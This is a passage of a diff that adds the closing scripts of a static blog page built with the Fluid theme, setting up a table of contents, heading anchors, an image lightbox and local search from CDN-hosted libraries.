+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
